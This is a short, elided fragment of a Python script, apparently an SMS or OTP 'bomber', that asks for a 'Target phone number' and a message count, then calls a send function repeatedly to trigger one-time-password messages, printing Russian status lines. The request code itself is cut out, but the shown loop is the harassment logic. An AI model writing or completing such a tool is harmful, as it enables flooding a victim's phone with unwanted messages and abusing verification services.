...
""")
	...
	def send(no):
		...
		if 'confirmotp' in str(res):
			print(i+1,"Доступ к сервису получен")
		else: print(i+1,"Доступ запрещён")
		#return True
	no=int(input("[?] Target phone number: "))
	jlm=int(input("[?] Messages: "))
	print()
	if jlm > 50:
		exit("[!] Слишком много сообщений, нужно меньше 50")
	for i in range(jlm):
		send(str(no))
		time.sleep(1)
